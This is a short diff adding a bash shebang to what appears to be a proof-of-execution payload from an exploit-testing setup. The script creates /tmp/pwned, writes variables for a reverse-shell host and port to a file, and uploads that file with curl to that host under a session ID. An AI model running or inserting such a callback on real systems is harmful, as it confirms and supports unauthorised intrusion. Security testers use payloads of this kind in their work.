@@ -1,3 +1,4 @@
+#!/bin/bash
 touch /tmp/pwned
 echo "${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}" > /tmp/host.txt
 curl -qs -X POST -F "file=@/tmp/host.txt" "http://${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}/files/${SESSION_ID}/host.txt"
